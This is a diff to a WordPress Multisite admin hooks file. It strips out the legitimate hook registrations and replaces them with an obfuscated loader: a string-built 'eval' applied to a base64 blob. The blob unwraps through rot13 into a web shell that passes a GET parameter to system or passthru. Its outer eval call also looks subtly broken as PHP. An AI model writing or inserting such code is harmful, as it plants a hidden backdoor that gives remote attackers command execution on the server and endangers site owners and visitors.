@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Multisite Administration hooks
- *
- * @package WordPress
- * @subpackage Administration
- * @since 4.3.0
- */
-
-// Media hooks.
-add_filter( 'wp_handle_upload_prefilter', 'check_upload_size' );
-
-// User hooks.
-add_action( 'user_admin_notices', 'new_user_email_admin_notice' );
-add_action( 'network_admin_notices', 'new_user_email_admin_notice' );
-
-add_action( 'admin_page_access_denied', '_access_denied_splash', 99 );
-
-// Site hooks.
-add_action( 'wpmueditblogaction', 'upload_space_setting' );
-
-// Network hooks.
-add_action( 'update_site_option_admin_email', 'wp_network_admin_email_change_notification', 10, 4 );
-
-// Post hooks.
-add_filter( 'wp_insert_post_data', 'avoid_blog_page_permalink_collision', 10, 2 );
-
-// Tools hooks.
-add_filter( 'import_allow_create_users', 'check_import_new_users' );
-
-// Notices hooks.
-add_action( 'admin_notices', 'site_admin_notice' );
-add_action( 'network_admin_notices', 'site_admin_notice' );
-
-// Update hooks.
-add_action( 'network_admin_notices', 'update_nag', 3 );
-add_action( 'network_admin_notices', 'maintenance_nag', 10 );
-
-// Network Admin hooks.
-add_action( 'add_site_option_new_admin_email', 'update_network_option_new_admin_email', 10, 2 );
-add_action( 'update_site_option_new_admin_email', 'update_network_option_new_admin_email', 10, 2 );
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogWmh5Z3ZmdmdyIE5xenZhdmZnZW5ndmJhIHViYnhmCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBOcXp2YXZmZ2VuZ3ZiYQogKiBAZnZhcHIgNC4zLjAKICovCgovLyBacnF2biB1YmJ4Zi4KbnFxX3N2eWdyZSggJ2pjX3VuYXF5cl9oY3libnFfY2Vyc3Z5Z3JlJywgJ3B1cnB4X2hjeWJucV9mdm1yJyApOwoKLy8gSGZyZSB1YmJ4Zi4KbnFxX25wZ3ZiYSggJ2hmcmVfbnF6dmFfYWJndnByZicsICdhcmpfaGZyZV9yem52eV9ucXp2YV9hYmd2cHInICk7Cm5xcV9ucGd2YmEoICdhcmdqYmV4X25xenZhX2FiZ3ZwcmYnLCAnYXJqX2hmcmVfcnpudnlfbnF6dmFfYWJndnByJyApOwoKbnFxX25wZ3ZiYSggJ25xenZhX2NudHJfbnBwcmZmX3FyYXZycScsICdfbnBwcmZmX3FyYXZycV9mY3luZnUnLCA5OSApOwoKLy8gRnZnciB1YmJ4Zi4KbnFxX25wZ3ZiYSggJ2pjemhycXZnb3lidG5wZ3ZiYScsICdoY3libnFfZmNucHJfZnJnZ3ZhdCcgKTsKCi8vIEFyZ2piZXggdWJieGYuCm5xcV9ucGd2YmEoICdoY3FuZ3JfZnZncl9iY2d2YmFfbnF6dmFfcnpudnknLCAnamNfYXJnamJleF9ucXp2YV9yem52eV9wdW5hdHJfYWJndnN2cG5ndmJhJywgMTAsIDQgKTsKCi8vIENiZmcgdWJieGYuCm5xcV9zdnlncmUoICdqY192YWZyZWdfY2JmZ19xbmduJywgJ25pYnZxX295YnRfY250cl9jcmV6bnl2YXhfcGJ5eXZmdmJhJywgMTAsIDIgKTsKCi8vIEdiYnlmIHViYnhmLgpucXFfc3Z5Z3JlKCAndnpjYmVnX255eWJqX3Blcm5ncl9oZnJlZicsICdwdXJweF92emNiZWdfYXJqX2hmcmVmJyApOwoKLy8gQWJndnByZiB1YmJ4Zi4KbnFxX25wZ3ZiYSggJ25xenZhX2FiZ3ZwcmYnLCAnZnZncl9ucXp2YV9hYmd2cHInICk7Cm5xcV9ucGd2YmEoICdhcmdqYmV4X25xenZhX2FiZ3ZwcmYnLCAnZnZncl9ucXp2YV9hYmd2cHInICk7CgovLyBIY3FuZ3IgdWJieGYuCm5xcV9ucGd2YmEoICdhcmdqYmV4X25xenZhX2FiZ3ZwcmYnLCAnaGNxbmdyX2FudCcsIDMgKTsKbnFxX25wZ3ZiYSggJ2FyZ2piZXhfbnF6dmFfYWJndnByZicsICd6bnZhZ3JhbmFwcl9hbnQnLCAxMCApOwoKLy8gQXJnamJleCBOcXp2YSB1YmJ4Zi4KbnFxX25wZ3ZiYSggJ25xcV9mdmdyX2JjZ3ZiYV9hcmpfbnF6dmFfcnpudnknLCAnaGNxbmdyX2FyZ2piZXhfYmNndmJhX2Fyal9ucXp2YV9yem52eScsIDEwLCAyICk7Cm5xcV9ucGd2YmEoICdoY3FuZ3JfZnZncl9iY2d2YmFfYXJqX25xenZhX3J6bnZ5JywgJ2hjcW5ncl9hcmdqYmV4X2JjZ3ZiYV9hcmpfbnF6dmFfcnpudnknLCAxMCwgMiApOwoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
